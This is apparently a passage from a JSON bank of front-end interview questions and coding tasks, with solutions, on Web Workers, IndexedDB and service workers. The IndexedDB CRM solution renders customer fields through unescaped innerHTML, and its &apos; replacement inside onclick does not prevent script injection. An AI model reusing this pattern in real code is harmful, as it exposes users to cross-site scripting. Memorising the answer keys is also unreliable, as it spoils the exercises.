            "Understanding of Web Worker's isolated environment",
            "Ability to distinguish accessible from inaccessible APIs"
          ],
          "example": "Attempts to access `document.getElementById('someId')` or `window.localStorage` directly within `worker.js` will result in an error because these objects are tied to the main thread's `window` context.",
          "tags": [
            "Web Workers",
            "Scope",
            "Limitations"
          ],
          "prerequisites": [
            "Web Workers Basics"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_worker_open_2",
          "topic": "Web Worker Use Cases",
          "level": "hard",
          "type": "open",
          "question": "Identify and explain two distinct real-world scenarios where using Web Workers would significantly improve the user experience or application performance.",
          "answer": "Web Workers are ideal for offloading tasks that would otherwise freeze the main thread. Here are two scenarios:\n\n1.  **Complex Data Processing/Calculations**: Imagine a web application that processes large CSV or JSON files uploaded by the user (e.g., for analytics, data visualization, or transformations). Parsing and processing hundreds of megabytes of data on the main thread would cause the UI to become unresponsive for several seconds or even minutes. By offloading this task to a Web Worker, the parsing, validation, and initial aggregation of data can happen in the background. The worker can send progress updates back to the main thread, allowing the UI to display a progress bar, and then send the final processed data for rendering once complete. This keeps the application interactive.\n\n2.  **Image Manipulation/Video Processing**: Consider an online image editor that allows users to apply complex filters (e.g., blur, sharpen, sepia) or resize large images. Performing these pixel-level manipulations directly on the main thread would be very computationally intensive, leading to a frozen UI. A Web Worker can be used to perform these image operations. The main thread can send the image data (e.g., `ImageData` or `Blob`) to the worker. The worker processes the image and sends the modified `ImageData` back. This allows the user to continue adjusting other settings or navigating the application while the image processing occurs in the background.",
          "analysisPoints": [
            "Identification of computationally intensive tasks.",
            "Clear explanation of how Web Workers solve the UI blocking problem in each scenario.",
            "Focus on 'user experience' and 'application performance' as requested.",
            "Real-world relevance of the examples."
          ],
          "keyConcepts": [
            "Web Workers",
            "Performance",
            "User Experience",
            "Concurrency",
            "Data Processing",
            "Image Manipulation"
          ],
          "evaluationCriteria": [
            "Relevant and well-explained scenarios",
            "Demonstrates understanding of Web Worker's application"
          ],
          "example": "A crypto trading platform could use a Web Worker to continuously compute complex indicator values (like moving averages or Bollinger Bands) on live market data, preventing UI lag that would occur if these calculations were done on the main thread, while simultaneously displaying real-time price updates.",
          "tags": [
            "Web Workers",
            "Use Cases",
            "Performance",
            "UX",
            "Real World"
          ],
          "prerequisites": [
            "Web Workers Basics",
            "Performance Optimization"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_web_worker_flashcard_2",
          "topic": "Web Worker `self` keyword",
          "level": "easy",
          "type": "flashcard",
          "question": "What does the `self` keyword refer to within a Web Worker script?",
          "answer": "Within a Web Worker script, `self` refers to the worker's own global scope. It's analogous to `window` in the main thread's global scope and is used to access worker-specific methods like `self.postMessage()` and `self.onmessage` (or `self.addEventListener()`).",
          "options": [],
          "analysisPoints": [
            "Knowledge of the worker's execution context.",
            "Analogy to the `window` object."
          ],
          "keyConcepts": [
            "Web Workers",
            "Global Scope",
            "self"
          ],
          "evaluationCriteria": [
            "Accurate definition of `self` in worker context"
          ],
          "example": "",
          "tags": [
            "Web Workers",
            "Concepts",
            "Context"
          ],
          "prerequisites": [
            "JavaScript Scopes"
          ],
          "complexity": 2,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        }
      ],
      "tasks": [
        {
          "id": "task_indexeddb_crud_manager",
          "title": "Implement a Basic IndexedDB CRM",
          "description": "\nDevelop a simple web-based Customer Relationship Management (CRM) system using IndexedDB for data storage. Your system should allow users to:\n\n1.  **Initialize Database**: Open a database named 'MyCRM' (version 1) and create an object store named 'customers' with `id` as the `keyPath` and `autoIncrement: true`.\n2.  **Add Customer**: Implement a function to add new customer records, each with `name` (string), `email` (string, must be unique), and `phone` (string) properties. Handle potential errors like duplicate emails.\n3.  **List Customers**: Implement a function to retrieve and display all customers from the 'customers' object store.\n4.  **Update Customer**: Implement a function to update an existing customer's `name` and `phone` based on their `id`.\n5.  **Delete Customer**: Implement a function to delete a customer record by their `id`.\n6.  **Search Customers**: Implement a function to search customers by their `name` (case-insensitive, partial match). You will need to create an index for `name`.\n\nEnsure all database operations are handled asynchronously with appropriate success and error callbacks.\n",
          "difficulty": "medium",
          "startingCode": "<html>\n<head>\n  <title>IndexedDB CRM</title>\n</head>\n<body>\n  <h1>Customer Management</h1>\n  <form id=\"customerForm\">\n    <input type=\"hidden\" id=\"customerId\">\n    <label for=\"name\">Name:</label><input type=\"text\" id=\"name\" required><br>\n    <label for=\"email\">Email:</label><input type=\"email\" id=\"email\" required><br>\n    <label for=\"phone\">Phone:</label><input type=\"text\" id=\"phone\"><br>\n    <button type=\"submit\">Add/Update Customer</button>\n  </form>\n  <hr>\n  <input type=\"text\" id=\"searchName\" placeholder=\"Search by name\">\n  <button id=\"searchButton\">Search</button>\n  <button id=\"clearSearchButton\">Clear Search</button>\n  <ul id=\"customerList\"></ul>\n  <script>\n    // TODO: Implement IndexedDB functions here\n\n    const dbName = 'MyCRM';\n    const dbVersion = 1;\n    let db;\n\n    function openDatabase() {\n      const request = indexedDB.open(dbName, dbVersion);\n\n      request.onupgradeneeded = function(event) {\n        db = event.target.result;\n        // Create object store if it doesn't exist\n        if (!db.objectStoreNames.contains('customers')) {\n          const objectStore = db.createObjectStore('customers', { keyPath: 'id', autoIncrement: true });\n          objectStore.createIndex('email', 'email', { unique: true });\n          objectStore.createIndex('name', 'name', { unique: false });\n        }\n      };\n\n      request.onsuccess = function(event) {\n        db = event.target.result;\n        console.log('Database opened successfully');\n        displayCustomers(); // Initial display\n      };\n\n      request.onerror = function(event) {\n        console.error('Database error:', event.target.errorCode);\n      };\n    }\n\n    function addCustomer(customer) {\n      // Implement add customer logic\n    }\n\n    function getCustomers(searchName = '') {\n      // Implement get all/search customers logic\n    }\n\n    function updateCustomer(customer) {\n      // Implement update customer logic\n    }\n\n    function deleteCustomer(id) {\n      // Implement delete customer logic\n    }\n\n    function displayCustomers(customers = []) {\n      const customerList = document.getElementById('customerList');\n      customerList.innerHTML = '';\n      if (customers.length === 0) {\n        customerList.innerHTML = '<li>No customers found.</li>';\n        return;\n      }\n      customers.forEach(customer => {\n        const li = document.createElement('li');\n        li.innerHTML = `ID: ${customer.id}, Name: ${customer.name}, Email: ${customer.email}, Phone: ${customer.phone || 'N/A'}\n          <button onclick=\"editCustomer(${customer.id}, '${customer.name}', '${customer.email}', '${customer.phone || ''}')\">Edit</button>\n          <button onclick=\"deleteCustomer(${customer.id})\">Delete</button>`;\n        customerList.appendChild(li);\n      });\n    }\n\n    function editCustomer(id, name, email, phone) {\n      document.getElementById('customerId').value = id;\n      document.getElementById('name').value = name;\n      document.getElementById('email').value = email;\n      document.getElementById('phone').value = phone;\n    }\n\n    // Event listeners\n    document.getElementById('customerForm').addEventListener('submit', function(event) {\n      event.preventDefault();\n      const id = document.getElementById('customerId').value;\n      const name = document.getElementById('name').value;\n      const email = document.getElementById('email').value;\n      const phone = document.getElementById('phone').value;\n\n      const customer = { name, email, phone };\n      if (id) {\n        customer.id = parseInt(id);\n        updateCustomer(customer);\n      } else {\n        addCustomer(customer);\n      }\n      this.reset();\n      document.getElementById('customerId').value = '';\n    });\n\n    document.getElementById('searchButton').addEventListener('click', () => {\n      const searchName = document.getElementById('searchName').value;\n      getCustomers(searchName);\n    });\n\n    document.getElementById('clearSearchButton').addEventListener('click', () => {\n      document.getElementById('searchName').value = '';\n      getCustomers();\n    });\n\n    openDatabase();\n  </script>\n</body>\n</html>\n",
          "solutionCode": "<html>\n<head>\n  <title>IndexedDB CRM</title>\n</head>\n<body>\n  <h1>Customer Management</h1>\n  <form id=\"customerForm\">\n    <input type=\"hidden\" id=\"customerId\">\n    <label for=\"name\">Name:</label><input type=\"text\" id=\"name\" required><br>\n    <label for=\"email\">Email:</label><input type=\"email\" id=\"email\" required><br>\n    <label for=\"phone\">Phone:</label><input type=\"text\" id=\"phone\"><br>\n    <button type=\"submit\">Add/Update Customer</button>\n  </form>\n  <hr>\n  <input type=\"text\" id=\"searchName\" placeholder=\"Search by name\">\n  <button id=\"searchButton\">Search</button>\n  <button id=\"clearSearchButton\">Clear Search</button>\n  <ul id=\"customerList\"></ul>\n  <script>\n    const dbName = 'MyCRM';\n    const dbVersion = 1;\n    let db;\n\n    function openDatabase() {\n      const request = indexedDB.open(dbName, dbVersion);\n\n      request.onupgradeneeded = function(event) {\n        db = event.target.result;\n        if (!db.objectStoreNames.contains('customers')) {\n          const objectStore = db.createObjectStore('customers', { keyPath: 'id', autoIncrement: true });\n          objectStore.createIndex('email', 'email', { unique: true });\n          objectStore.createIndex('name', 'name', { unique: false });\n        }\n      };\n\n      request.onsuccess = function(event) {\n        db = event.target.result;\n        console.log('Database opened successfully');\n        displayCustomers();\n      };\n\n      request.onerror = function(event) {\n        console.error('Database error:', event.target.errorCode);\n      };\n    }\n\n    function addCustomer(customer) {\n      const transaction = db.transaction(['customers'], 'readwrite');\n      const objectStore = transaction.objectStore('customers');\n      const addRequest = objectStore.add(customer);\n\n      addRequest.onsuccess = () => {\n        console.log('Customer added:', customer);\n        displayCustomers();\n      };\n      addRequest.onerror = (e) => {\n        console.error('Error adding customer:', e.target.error);\n        alert('Error adding customer: ' + e.target.error.message);\n      };\n    }\n\n    function getCustomers(searchName = '') {\n      const transaction = db.transaction(['customers'], 'readonly');\n      const objectStore = transaction.objectStore('customers');\n      let request;\n\n      if (searchName) {\n        const nameIndex = objectStore.index('name');\n        // Use a cursor for partial, case-insensitive search\n        const lowerSearchName = searchName.toLowerCase();\n        const customersFound = [];\n\n        nameIndex.openCursor().onsuccess = function(event) {\n          const cursor = event.target.result;\n          if (cursor) {\n            // Case-insensitive partial match\n            if (cursor.value.name.toLowerCase().includes(lowerSearchName)) {\n              customersFound.push(cursor.value);\n            }\n            cursor.continue();\n          } else {\n            displayCustomers(customersFound);\n          }\n        };\n        nameIndex.openCursor().onerror = (e) => console.error('Cursor error:', e.target.error);\n\n      } else {\n        request = objectStore.getAll();\n        request.onsuccess = function(event) {\n          displayCustomers(event.target.result);\n        };\n        request.onerror = (e) => console.error('Error getting customers:', e.target.error);\n      }\n    }\n\n    function updateCustomer(customer) {\n      const transaction = db.transaction(['customers'], 'readwrite');\n      const objectStore = transaction.objectStore('customers');\n\n      const updateRequest = objectStore.put(customer);\n      updateRequest.onsuccess = () => {\n        console.log('Customer updated:', customer);\n        displayCustomers();\n      };\n      updateRequest.onerror = (e) => {\n        console.error('Error updating customer:', e.target.error);\n        alert('Error updating customer: ' + e.target.error.message);\n      };\n    }\n\n    function deleteCustomer(id) {\n      const transaction = db.transaction(['customers'], 'readwrite');\n      const objectStore = transaction.objectStore('customers');\n\n      const deleteRequest = objectStore.delete(id);\n      deleteRequest.onsuccess = () => {\n        console.log('Customer deleted with ID:', id);\n        displayCustomers();\n      };\n      deleteRequest.onerror = (e) => {\n        console.error('Error deleting customer:', e.target.error);\n        alert('Error deleting customer: ' + e.target.error.message);\n      };\n    }\n\n    function displayCustomers(customers = []) {\n      const customerList = document.getElementById('customerList');\n      customerList.innerHTML = '';\n      if (customers.length === 0) {\n        customerList.innerHTML = '<li>No customers found.</li>';\n        return;\n      }\n      customers.forEach(customer => {\n        const li = document.createElement('li');\n        li.innerHTML = `ID: ${customer.id}, Name: ${customer.name}, Email: ${customer.email}, Phone: ${customer.phone || 'N/A'}\n          <button onclick=\"editCustomer(${customer.id}, '${customer.name.replace(/'/g, \"&apos;\")}', '${customer.email.replace(/'/g, \"&apos;\")}', '${(customer.phone || '').replace(/'/g, \"&apos;\")}')\">Edit</button>\n          <button onclick=\"deleteCustomer(${customer.id})\">Delete</button>`;\n        customerList.appendChild(li);\n      });\n    }\n\n    function editCustomer(id, name, email, phone) {\n      document.getElementById('customerId').value = id;\n      document.getElementById('name').value = name;\n      document.getElementById('email').value = email;\n      document.getElementById('phone').value = phone;\n    }\n\n    document.getElementById('customerForm').addEventListener('submit', function(event) {\n      event.preventDefault();\n      const id = document.getElementById('customerId').value;\n      const name = document.getElementById('name').value;\n      const email = document.getElementById('email').value;\n      const phone = document.getElementById('phone').value;\n\n      const customer = { name, email, phone };\n      if (id) {\n        customer.id = parseInt(id);\n        updateCustomer(customer);\n      } else {\n        addCustomer(customer);\n      }\n      this.reset();\n      document.getElementById('customerId').value = '';\n    });\n\n    document.getElementById('searchButton').addEventListener('click', () => {\n      const searchName = document.getElementById('searchName').value;\n      getCustomers(searchName);\n    });\n\n    document.getElementById('clearSearchButton').addEventListener('click', () => {\n      document.getElementById('searchName').value = '';\n      getCustomers();\n    });\n\n    openDatabase();\n  </script>\n</body>\n</html>\n",
          "testCases": [
            "Add a new customer: Submit form with new name, email, phone. Verify it appears in the list.",
            "Add a customer with a duplicate email: Submit form with an email already in use. Verify an error message appears and the customer is not added.",
            "Update an existing customer: Click 'Edit' on a customer, change name/phone, submit. Verify changes in the list.",
            "Delete a customer: Click 'Delete' on a customer. Verify it's removed from the list.",
            "Search by full name: Enter a full customer name in search. Verify only matching customer(s) appear.",
            "Search by partial name (case-insensitive): Enter 'john' when 'John Doe' exists. Verify 'John Doe' appears.",
            "Clear search: After a search, click 'Clear Search'. Verify all customers are shown again.",
            "Empty database: Verify 'No customers found.' is displayed initially or after all deletions.",
            "Persistence: Add a few customers, close and reopen the browser tab. Verify customers are still there."
          ],
          "hints": [
            "Remember that `onupgradeneeded` is the *only* place to create or delete object stores and indexes.",
            "For the search functionality, consider using an `IDBCursor` on the 'name' index for partial and case-insensitive matching.",
            "Always handle `onsuccess` and `onerror` callbacks for each IndexedDB request.",
            "Use `db.transaction(['objectStoreNames'], 'mode')` where `mode` is `readonly` or `readwrite`."
          ],
          "tags": [
            "IndexedDB",
            "CRUD",
            "DOM",
            "Web APIs",
            "Client-Side Storage",
            "Full Stack (Frontend Focus)"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "IndexedDB Basics",
            "Asynchronous JavaScript",
            "HTML/CSS/JS DOM Manipulation"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "IndexedDB Transactions",
            "IndexedDB Indexes",
            "Error Handling",
            "Client-Side Database Design"
          ]
        },
        {
          "id": "task_service_worker_offline_page",
          "title": "Implement an Offline Fallback Page with Service Worker",
          "description": "\nCreate a basic web page and a Service Worker that implements an offline fallback. When the user tries to navigate to a page that isn't cached and they are offline, the Service Worker should serve a custom 'offline.html' page instead of the browser's default offline error.\n\n**Requirements:**\n1.  **HTML Structure**: Create `index.html`, `about.html`, and `offline.html`.\n2.  **Service Worker Registration**: Register `sw.js` in `index.html`.\n3.  **Installation**: In `sw.js`, pre-cache `index.html`, `offline.html`, and `style.css` during the `install` event.\n4.  **Fetch Interception**: Intercept all `fetch` requests.\n5.  **Offline Fallback**: If a network request fails (e.g., due to being offline) and the requested resource is not in the cache, serve `offline.html`.\n6.  **Caching Strategy**: For online requests, use a 'Cache, then Network fallback' strategy. (Try cache first, if not found, then network).\n7.  **Testing**: Verify by going offline (e.g., in browser DevTools) and trying to load `about.html` (which isn't pre-cached).\n",
          "difficulty": "medium",
          "startingCode": "```html\n<!-- index.html -->\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Online/Offline App</title>\n  <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n  <h1>Welcome</h1>\n  <nav>\n    <a href=\"index.html\">Home</a> |\n    <a href=\"about.html\">About Us</a>\n  </nav>\n  <p>This is the home page.</p>\n\n  <script>\n    if ('serviceWorker' in navigator) {\n      window.addEventListener('load', function() {\n        navigator.serviceWorker.register('/sw.js').then(function(registration) {\n          console.log('ServiceWorker registration successful with scope: ', registration.scope);\n        }).catch(function(err) {\n          console.log('ServiceWorker registration failed: ', err);\n        });\n      });\n    }\n  </script>\n</body>\n</html>\n\n<!-- about.html -->\n<!DOCTYPE html>\n<html>\n<head>\n  <title>About Us</title>\n  <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n  <h1>About Us</h1>\n  <nav>\n    <a href=\"index.html\">Home</a> |\n    <a href=\"about.html\">About Us</a>\n  </nav>\n  <p>This is the about page.</p>\n</body>\n</html>\n\n<!-- offline.html -->\n<!DOCTYPE html>\n<html>\n<head>\n  <title>You are Offline!</title>\n  <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n  <h1>You are Offline!</h1>\n  <p>It seems you are not connected to the internet.</p>\n  <p>Please check your network connection and try again.</p>\n  <p><a href=\"index.html\">Go to Home Page (Cached)</a></p>\n</body>\n</html>\n\n<!-- style.css -->\nbody { font-family: sans-serif; padding: 20px; text-align: center; }\nh1 { color: #333; }\nnav a { margin: 0 10px; text-decoration: none; color: #007bff; }\n\n<!-- sw.js (empty) -->\n// Service Worker logic goes here\n```",
          "solutionCode": "```html\n<!-- index.html (same as starting code) -->\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Online/Offline App</title>\n  <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n  <h1>Welcome</h1>\n  <nav>\n    <a href=\"index.html\">Home</a> |\n    <a href=\"about.html\">About Us</a>\n  </nav>\n  <p>This is the home page.</p>\n\n  <script>\n    if ('serviceWorker' in navigator) {\n      window.addEventListener('load', function() {\n        navigator.serviceWorker.register('/sw.js').then(function(registration) {\n          console.log('ServiceWorker registration successful with scope: ', registration.scope);\n        }).catch(function(err) {\n          console.log('ServiceWorker registration failed: ', err);\n        });\n      });\n    }\n  </script>\n</body>\n</html>\n\n<!-- about.html (same as starting code) -->\n<!DOCTYPE html>\n<html>\n<head>\n  <title>About Us</title>\n  <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n  <h1>About Us</h1>\n  <nav>\n    <a href=\"index.html\">Home</a> |\n    <a href=\"about.html\">About Us</a>\n  </nav>\n  <p>This is the about page.</p>\n</body>\n</html>\n\n<!-- offline.html (same as starting code) -->\n<!DOCTYPE html>\n<html>\n<head>\n  <title>You are Offline!</title>\n  <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n  <h1>You are Offline!</h1>\n  <p>It seems you are not connected to the internet.</p>\n  <p>Please check your network connection and try again.</p>\n  <p><a href=\"index.html\">Go to Home Page (Cached)</a></p>\n</body>\n</html>\n\n<!-- style.css (same as starting code) -->\nbody { font-family: sans-serif; padding: 20px; text-align: center; }\nh1 { color: #333; }\nnav a { margin: 0 10px; text-decoration: none; color: #007bff; }\n```\n\n```javascript\n// sw.js\nconst CACHE_NAME = 'offline-fallback-cache-v1';\nconst OFFLINE_URL = '/offline.html';\nconst ASSETS_TO_CACHE = [\n  '/', // Catches root requests like example.com/\n  '/index.html',\n  OFFLINE_URL,\n  '/style.css'\n];\n\nself.addEventListener('install', (event) => {\n  console.log('[Service Worker] Installing...');\n  event.waitUntil(\n    caches.open(CACHE_NAME)\n      .then((cache) => {\n        console.log('[Service Worker] Pre-caching essential assets:', ASSETS_TO_CACHE);\n        return cache.addAll(ASSETS_TO_CACHE);\n      })\n      .catch((error) => {\n        console.error('[Service Worker] Pre-caching failed:', error);\n      })\n  );\n});\n\nself.addEventListener('activate', (event) => {\n  console.log('[Service Worker] Activating...');\n  event.waitUntil(\n    caches.keys().then((cacheNames) => {\n      return Promise.all(\n        cacheNames.map((cacheName) => {\n          if (cacheName !== CACHE_NAME) {\n            console.log('[Service Worker] Deleting old cache:', cacheName);\n            return caches.delete(cacheName);\n          }\n        })\n      );\n    })\n  );\n  // Take control of all clients as soon as activated\n  return self.clients.claim();\n});\n\nself.addEventListener('fetch', (event) => {\n  // Only handle GET requests and non-chrome-extension requests\n  if (event.request.method !== 'GET' || event.request.url.startsWith('chrome-extension')) {\n    return;\n  }\n\n  event.respondWith(\n    caches.match(event.request)\n      .then((response) => {\n        // Cache hit - return response\n        if (response) {\n          console.log('[Service Worker] Serving from cache:', event.request.url);\n          return response;\n        }\n\n        // No cache hit - fetch from network\n        console.log('[Service Worker] Fetching from network:', event.request.url);\n        return fetch(event.request)\n          .then((networkResponse) => {\n            // Check if we received a valid response\n            if (networkResponse && networkResponse.status === 200 && networkResponse.type === 'basic') {\n              // Clone the response to put in cache (response is a stream and can only be consumed once)\n              const responseToCache = networkResponse.clone();\n              caches.open(CACHE_NAME).then((cache) => {\n                cache.put(event.request, responseToCache);\n              });\n            }\n            return networkResponse;\n          })\n          .catch(() => {\n            // Network request failed, probably offline\n            console.log('[Service Worker] Network request failed, serving offline page.');\n            return caches.match(OFFLINE_URL); // Serve the offline fallback page\n          });\n      })\n  );\n});\n```",
          "testCases": [
            "Load index.html online: Verify page loads normally. Check DevTools Network tab for Service Worker interception.",
            "Go offline: In DevTools, go to 'Application' -> 'Service Workers', check 'Offline' box. Or set network throttling to 'Offline'.",
            "Reload index.html offline: Verify index.html still loads (from cache).",
            "Navigate to about.html offline: Verify about.html loads offline.html instead.",
            "Clear site data: Clear cache/Service Worker, then reload online. Verify everything re-caches.",
            "Update Service Worker: Change a cached asset (e.g., `style.css`), increment `CACHE_NAME` in `sw.js`. Reload `index.html` twice (once to activate new SW, once to load new asset). Verify updated asset is served."
          ],
          "hints": [
            "The `install` event is where you typically pre-cache your essential assets using `caches.open()` and `cache.addAll()`.",
            "The `fetch` event listener is where you intercept network requests. Use `event.respondWith()` to control the response.",
            "To implement the offline fallback, use a `.catch()` block on the `fetch(event.request)` promise, and inside it, return `caches.match(OFFLINE_URL)`.",
            "Remember that `Response` objects are streams and can only be consumed once. If you need to consume it (e.g., for `cache.put()`) and also return it, you'll need to `clone()` it."
          ],
          "tags": [
            "Service Workers",
            "PWA",
            "Offline",
            "Caching",
            "Web APIs",
            "Performance"
          ],
          "timeEstimate": 75,
          "prerequisites": [
            "Service Worker Basics",
            "Asynchronous JavaScript",
            "Promises",
            "HTML/CSS"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Service Worker Lifecycle",
            "Cache Storage API",
            "Fetch API",
            "Network Resilience"
          ]
        },
        {
          "id": "task_web_worker_heavy_computation",
          "title": "Perform Heavy Computation with Web Worker and Display Progress",
          "description": "\nCreate a web application that calculates prime numbers up to a large limit (e.g., 10 million) using a Web Worker. The main thread should initiate the calculation, but the computationally intensive part should happen in the worker. To provide a better user experience, the worker should send progress updates back to the main thread, and the main thread should display this progress.\n\n**Requirements:**\n1.  **HTML**: A simple page with an input field for the limit, a 'Start Calculation' button, a progress display (e.g., a `div` or `span`), and a result display.\n2.  **Main Thread Script**: \n    *   Create and manage the Web Worker instance.\n    *   Send the calculation limit to the worker via `postMessage()`.\n    *   Listen for `message` events from the worker to receive progress updates and the final result.\n    *   Update the UI (progress and result) based on messages from the worker.\n    *   Ensure the UI remains responsive during computation.\n3.  **Worker Script**: \n    *   Listen for `message` events from the main thread.\n    *   Implement the prime number calculation (e.g., Sieve of Eratosthenes) for the given limit.\n    *   Periodically send progress updates (e.g., every 1% or 10% completion) back to the main thread.\n    *   Send the final list of prime numbers or their count back to the main thread.\n4.  **Error Handling**: Basic error handling for worker creation or messages.\n",
          "difficulty": "hard",
          "startingCode": "```html\n<!-- index.html -->\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Prime Number Calculator</title>\n  <style>\n    body { font-family: sans-serif; padding: 20px; }\n    #progress { margin-top: 10px; color: blue; }\n    #result { margin-top: 10px; color: green; }\n  </style>\n</head>\n<body>\n  <h1>Prime Number Calculator</h1>\n  <label for=\"limit\">Calculate primes up to:</label>\n  <input type=\"number\" id=\"limit\" value=\"1000000\" min=\"1000\" step=\"1000\">\n  <button id=\"startButton\">Start Calculation</button>\n  <hr>\n  <div id=\"progress\">Progress: 0%</div>\n  <div id=\"result\">Result: Not started</div>\n\n  <script>\n    let worker;\n\n    document.getElementById('startButton').addEventListener('click', () => {\n      const limit = parseInt(document.getElementById('limit').value);\n      if (isNaN(limit) || limit < 1) {\n        alert('Please enter a valid positive number for the limit.');\n        return;\n      }\n\n      document.getElementById('progress').textContent = 'Progress: 0%';\n      document.getElementById('result').textContent = 'Result: Calculating...';\n      document.getElementById('startButton').disabled = true;\n\n      // TODO: Create Web Worker and handle communication\n      if (worker) { worker.terminate(); } // Terminate previous worker if exists\n      worker = new Worker('prime_calculator.js');\n\n      worker.onmessage = function(event) {\n        const data = event.data;\n        if (data.type === 'progress') {\n          document.getElementById('progress').textContent = `Progress: ${data.value}%`;\n        } else if (data.type === 'result') {\n          document.getElementById('result').textContent = `Result: Found ${data.count} primes. Max: ${data.maxPrime}`; // Display only count for very large numbers\n          document.getElementById('startButton').disabled = false;\n        }\n      };\n\n      worker.onerror = function(error) {\n        console.error('Worker error:', error);\n        document.getElementById('result').textContent = 'Result: Error during calculation.';\n        document.getElementById('startButton').disabled = false;\n      };\n\n      worker.postMessage({ type: 'start', limit: limit });\n    });\n\n  </script>\n</body>\n</html>\n\n<!-- prime_calculator.js (empty) -->\n// Web Worker script for prime number calculation\n```",
          "solutionCode": "```html\n<!-- index.html (as above, only script content changes) -->\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Prime Number Calculator</title>\n  <style>\n    body { font-family: sans-serif; padding: 20px; }\n    #progress { margin-top: 10px; color: blue; }\n    #result { margin-top: 10px; color: green; }\n  </style>\n</head>\n<body>\n  <h1>Prime Number Calculator</h1>\n  <label for=\"limit\">Calculate primes up to:</label>\n  <input type=\"number\" id=\"limit\" value=\"1000000\" min=\"1000\" step=\"1000\">\n  <button id=\"startButton\">Start Calculation</button>\n  <hr>\n  <div id=\"progress\">Progress: 0%</div>\n  <div id=\"result\">Result: Not started</div>\n\n  <script>\n    let worker;\n\n    document.getElementById('startButton').addEventListener('click', () => {\n      const limit = parseInt(document.getElementById('limit').value);\n      if (isNaN(limit) || limit < 1) {\n        alert('Please enter a valid positive number for the limit.');\n        return;\n      }\n\n      document.getElementById('progress').textContent = 'Progress: 0%';\n      document.getElementById('result').textContent = 'Result: Calculating...';\n      document.getElementById('startButton').disabled = true;\n\n      if (worker) { worker.terminate(); } \n      worker = new Worker('prime_calculator.js');\n\n      worker.onmessage = function(event) {\n        const data = event.data;\n        if (data.type === 'progress') {\n          document.getElementById('progress').textContent = `Progress: ${data.value}%`;\n        } else if (data.type === 'result') {\n          document.getElementById('result').textContent = `Result: Found ${data.count} primes. Max: ${data.maxPrime}`; \n          document.getElementById('startButton').disabled = false;\n        } else if (data.type === 'error') {\n          console.error('Worker reported error:', data.message);\n          document.getElementById('result').textContent = `Result: Error - ${data.message}`;\n          document.getElementById('startButton').disabled = false;\n        }\n      };\n\n      worker.onerror = function(error) {\n        console.error('Worker error:', error);\n        document.getElementById('result').textContent = 'Result: Error during calculation.';\n        document.getElementById('startButton').disabled = false;\n      };\n\n      worker.postMessage({ type: 'start', limit: limit });\n    });\n\n  </script>\n</body>\n</html>\n```\n\n```javascript\n// prime_calculator.js\nself.onmessage = function(event) {\n  const { type, limit } = event.data;\n\n  if (type === 'start') {\n    try {\n      const primes = sieveOfEratosthenes(limit, (progress) => {\n        // Send progress updates back to the main thread\n        self.postMessage({ type: 'progress', value: progress });\n      });\n      const maxPrime = primes.length > 0 ? primes[primes.length - 1] : 0;\n      self.postMessage({ type: 'result', count: primes.length, maxPrime: maxPrime });\n    } catch (e) {\n      self.postMessage({ type: 'error', message: e.message });\n    }\n  }\n};\n\nfunction sieveOfEratosthenes(limit, onProgress) {\n  if (limit < 2) return [];\n  const isPrime = new Array(limit + 1).fill(true);\n  isPrime[0] = isPrime[1] = false; // 0 and 1 are not prime\n\n  const sqrtLimit = Math.sqrt(limit);\n  for (let p = 2; p <= sqrtLimit; p++) {\n    if (isPrime[p]) {\n      for (let multiple = p * p; multiple <= limit; multiple += p) {\n        isPrime[multiple] = false;\n      }\n    }\n  }\n\n  const primes = [];\n  const totalSteps = limit;\n  let lastProgress = 0;\n\n  for (let i = 2; i <= limit; i++) {\n    if (isPrime[i]) {\n      primes.push(i);\n    }\n    // Send progress update periodically\n    const currentProgress = Math.floor((i / totalSteps) * 100);\n    if (currentProgress > lastProgress && currentProgress % 5 === 0) { // Update every 5%\n      onProgress(currentProgress);\n      lastProgress = currentProgress;\n    }\n  }\n  onProgress(100); // Ensure 100% is always sent at the end\n  return primes;\n}\n```",
          "testCases": [
            "Calculate for a small limit (e.g., 1000): Verify quick calculation and correct prime count.",
            "Calculate for a medium limit (e.g., 1,000,000): Verify progress updates are visible and UI remains responsive (try clicking around or typing in other inputs).",
            "Calculate for a large limit (e.g., 10,000,000): Verify sustained progress updates and UI responsiveness. Note: The browser might still show a temporary 'page unresponsive' warning due to message passing overhead for very frequent updates or rendering large numbers of primes if displayed, but the core calculation is off-main thread.",
            "Invalid input: Enter non-numeric or negative limit. Verify error handling in main thread.",
            "Start calculation multiple times: Verify the previous worker is terminated and a new one starts correctly."
          ],
          "hints": [
            "Use the Sieve of Eratosthenes algorithm for efficient prime number generation.",
            "Remember that data passed between the main thread and the worker is copied, not shared. For very large data sets, consider using `Transferable` objects if performance is critical.",
            "Implement `onmessage` on both sides (`worker.onmessage` in main, `self.onmessage` in worker) for two-way communication.",
            "To report progress, decide on a reasonable interval (e.g., every 1% or 5% of completion) and `postMessage` a progress object to the main thread.",
            "For very large numbers, ensure your prime calculation (especially if counting) handles potential JavaScript number limits or use `BigInt` if you need to work with numbers larger than `Number.MAX_SAFE_INTEGER`."
          ],
          "tags": [
            "Web Workers",
            "Performance",
            "Concurrency",
            "Algorithms",
            "User Experience",
            "Background Processing"
          ],
          "timeEstimate": 120,
          "prerequisites": [
            "Web Workers Basics",
            "Asynchronous JavaScript",
            "Algorithm Design (basic)"
          ],
          "complexity": 9,
          "interviewRelevance": 10,
          "learningPath": "expert",
          "relatedConcepts": [
            "Main Thread Blocking",
            "Event Loop",
            "Sieve of Eratosthenes",
            "Progressive Enhancement"
